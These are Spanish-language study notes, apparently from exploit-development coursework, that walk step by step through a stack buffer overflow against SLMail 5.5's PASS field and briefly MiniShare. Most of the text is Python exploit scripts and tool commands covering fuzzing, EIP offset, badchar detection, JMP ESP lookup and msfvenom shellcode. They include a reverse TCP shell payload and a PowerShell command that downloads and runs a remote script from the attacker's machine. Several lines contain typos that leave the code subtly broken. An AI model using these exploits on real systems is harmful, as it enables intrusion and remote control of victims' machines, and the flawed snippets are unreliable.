# Explotacion

## tomando control del EIP

slmail 5.5 (campo pass vulnerable a bfo)

iniciamos el inmmunity debugger al cual le hemos añadido la opcion de mona.py de github

ESP: pila de stack EIP: apunta a la siguiente instruccion a ejecutar (instruction pointer)

Lo primero que tenemos que hacer es fuzzing mediante un script en python

```python

#!/usr/bin/python3

import socket
import sys



if len(sys,argv !=2)
	print("\n usage: exploit.py <length>")
	exit(1)

#variables globales

ip_address = "ip victima"
port = puerto victima
total_lenght = (int(sys.argv[1])

def exploit():
		
		#create a socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#connect to the server
		 
		s.connect((ip_address, port))
		#recieve banner
		
		banner = s.recv(1024)

		
		s.send(b"USER <usuario>" + b'\r\n') #b indica que esta en formato bytes, \r es retorno de carro
		response = s.recv(1024)

		s.send(b"PASS " + b"A"*total_length + b'\r\n')
		s.close()
		
if __name__ == '__main__':
	exploit()

```

vemos que metiendole 5000 A el programa peta, nos lo muestra el inmmunity debuger ya que el programa esta en paused

EIP= 41414141 (que son las AAAA)

ahora tenemos que ver cuantas AAA tenemos que introducir antes de que se produzca el BOF

jugamos con una utilidad que te proporciona metasploit:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

esto generaría 5000 bytes "aleatorios" esto nos permitirá saber el pattern offsec los caracteres que nos genera tenemos que copiarlos y ver cuanto vale el pattern offsec

```python

#!/usr/bin/python3

import socket
import sys




#variables globales

ip_address = "ip victima"
port = puerto victima
payload=b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'

def exploit():
		
		#create a socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#connect to the server
		 
		s.connect((ip_address, port))
		#recieve banner
		
		banner = s.recv(1024)

		
		s.send(b"USER <usuario>" + b'\r\n') #b indica que esta en formato bytes, \r es retorno de carro
		response = s.recv(1024)

		s.send(b"PASS " + payload + b'\r\n')
		s.close()
		
if __name__ == '__main__':
	exploit()
```

de esta forma le enviamos el payload completo y vemos cuanto vale el EIP para ver en que momento se produce el BOF

EIP = 7A46317A

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A
```

```
[*] Exact match at offset 4654
```

offset = 4654

```

#!/usr/bin/python3

import socket
import sys




#variables globales

ip_address = "ip victima"
port = puerto victima
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
payload = before_eip + eip

def exploit():
		
		#create a socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#connect to the server
		 
		s.connect((ip_address, port))
		#recieve banner
		
		banner = s.recv(1024)

		
		s.send(b"USER <usuario>" + b'\r\n') #b indica que esta en formato bytes, \r es retorno de carro
		response = s.recv(1024)

		s.send(b"PASS " + payload + b'\r\n')
		s.close()
		
if __name__ == '__main__':
	exploit()
```

ya sabemos cual es el offset por lo que ahora podemos controlar lo que vale el EIP en este caso vale 4 B

cuando metemos este exploit, el EIP vale 42424242 que son las 4 B que es lo que hemos añadido en el payload

posteriormente metemos mas caracteres para ver donde estan representados estos caracteres, nuestro objetivo es ver donde se representan estos caracteres para saber donde estan representados en la pila y asi poder apuntar a la zona de memoria que queremos

## Asignacion de espacio para shellcode

¿donde van los caracteres despues de haber sobreescrito el EIP?

ESP= direccion actual de la pila del programa en la memoria

la pila se almacena de manera temporal información como pueden ser valores de variables y direcciones de retorno de funciones

```

#!/usr/bin/python3

import socket
import sys




#variables globales

ip_address = "ip victima"
port = puerto victima
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
after_eip = b"C" * 200
payload = before_eip + eip + after_eip

def exploit():
		
		#create a socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#connect to the server
		 
		s.connect((ip_address, port))
		#recieve banner
		
		banner = s.recv(1024)

		
		s.send(b"USER <usuario>" + b'\r\n') #b indica que esta en formato bytes, \r es retorno de carro
		response = s.recv(1024)

		s.send(b"PASS " + payload + b'\r\n')
		s.close()
		
if __name__ == '__main__':
	exploit()
```

aqui el ESP = 0251A128

la idea es que el EIP apunte como operation code a un jump sp para apuntar a al ESP como siguiente instruccion y como el DEP esta deshabilitado nos interpretará estas instrucciones

Una vez que se ha identificado la ubicación de los caracteres en la memoria, la idea principal en este punto es introducir un **shellcode** en esa ubicación, que son instrucciones de bajo nivel las cuales en este caso corresponderán a una instrucción maliciosa.

no todos los caracterers son interpretados por el program algunos sor badchars que hacen que programa se corrompa, tenemos que interpretar que caracteres no son interpretados correctament epor el programa (cada programa tiene su badchars por lo cual tenemos que hacer fuzzing para ver cuales son los badchars del programa en cuestion)

## Generación de Bytearrays y detección de Badchars

```
! mona config -set workingfolder C:\Users\jorge\Desktop\Analysis
```

```
!mona bytearray -cpb "\x00"
```

esto nos generara en la carpeta de trabajo que hayamos indicado un shell code sin el null byte porque lo hemos indicado en el segundo parámetro

ahora en la pila en vez de las C como hacimos antes vamos a tratar de meter estos caracteres que nos ha generado mona y tneemps que ver que caracter no sale representado en el inmmunity debugger, si no sale representado es que es un badchar y el programa no te lo esta representado con lo cual hay que excluirlo, posteriormente con msfvenom generaremos un programa sin esos caracteres

podemos crear un recurso compartido a nivel de red de samba mediante el comando sincronizado con nuestra carpeta actual de trahbajo y le damos soporto para smb2

```
impacket-smbserver smbfolder -smb $(pwd) -smb2support 
```

en el buscador de archivos podemos poner

```
\\<ip atacante>\smbfolder
```

y nos transferimos el bytearray que hemos genrado en la maquina victima

!\[\[Pasted image 20251015143901.png]]

(en el ESP pinchamos y le damos a follow in dump ) para ver los badchars

```
!mona compare -a <direccionESP> -f <direccion a nuestro bytearray.bin>
```

!\[\[Pasted image 20251015144324.png]]

como vemos los badchars con 00 y 0a

```
!mona bytearray -cpb "\x00\x0a"
```

y nos volvemos a copiar el bytearray generado y volvemos a mandar el exploit. lo volvemos a hacer hasta que no tenga ningun badchar

posteriormente otra vez nos puede generar nuevos badchars por lo que volveriamos a hacer el mismo proceso

podemos transferirlo de nuevo o solamente quitarlo de nuestro equipo el badchar

ahora que ya sabemos podemos generar un shell code sin estos para permitirnos ejecutar comandos en la consola

si el DEP esta habilitado esta impide quue se puedan ejecutar comandos en la pila no te lo va a interpretar

ahora es cuando intentamos apuntar desde el EIP a salto al ESP, metiendo breakpoints

## Busqueda de Opcodes para entrar al ESP y cargar nuestro shellcode

```
msfvenom -p winddows/shell_reverce_tcp --platform windows -a x86 LHOST=<ip atacante> LPORT=<puerto atacante> -f c -e x86/shikata_ga_nai -b '\x00\0xa\0xd'EXITFUNC=thread 
```

-b para indicar los badchars EXITFUNC=thread hace que no se par el programa y siga corriendo

```
!mona find -s "\xFFxE4" -m SLMFC.DLL
```

para buscar si tiene el op code jump sp en ese dll y pulsamos enter y buscamos una instruccion que no contenga ninguno de los badchars que hayamos visto anteriormente le damos click derecho copy to clipbloard address.

el EIP ahora debe vale valor que hemos copiado (recordar que tiene que ir dado la vuelta al ser un opcode) esto lo podemos hacser con la funcion pack de python

```
eip = pack ("<L", 0x5f4c4d13)
```

de esta manera el EIP apuntara al ESP mediante un jump sp

para ver que opcode corresponde al jump sp podemos mirarlo de la siguiente forma

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

que nos dará el ==FFE4==

en el caso de tener muchos badchars simplemente quitar la opcion de shikata ga nai en msfvenom

## # Uso de NOPs, desplazamientos en pila e interpretación del Shellcode para lograr RCE

```
payload =before_eip +eip + b"\x90"*16 +shellcode
```

introducimos 16 NOPs para darle tiempo al programa a intrepetar nuestro shellcode y que asi funcione correctamente nuestro RCE

tambien se puede hacesr mediante un desplazamiento de la pila para que tarde más en ejecutar el shellcode y se interprete correctamente

en nasm\_shell.rb que mencionabamos antes poner

```
sub esp 0x10
```

esto nos da la instruccion ==83EC10== para mover la pila 16 veces

entonces hariamos

```
payload = before_eip +eip + b"\0x84\0xEC\0x10" +shellcode
```

y el efecto va a ser el mismo

## modificación del shell code para controlar el comando a ejecutar

```
msfvenom -p winddows/exec CMD="powershell EIX(New-object-Net.Webclient).downloadString('http://<ip atacante>/PS.ps1')" --platform windows -a -f c -e x86/shikata_ga_nai -b '\x00\0xa\0xd'EXITFUNC=thread 
```

el script ps1 es el siguiente

```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

que lo renombraremos con PS.ps1 y cambiamos la ip y el puerto por el nuestro

## otra prueba

un servicio llamado minishare produce un BOF cuando le envias dato a la raiz de un servicio web

!\[\[Pasted image 20251015182603.png]]

bucle infinito para ver cada 100 bytes enviados cuando el programa peta

nos da que con 1800 bytes ha petado entonces creamos el exploit de msfvenom con esos bytes -l 1800

tener en cuenta que si cpn find no encontramos ningun modulo que controle el jump esp podemos hacer

```
!mona findwild -s "JMP ESP"
```

y buscar alguno que no contenga los badchars
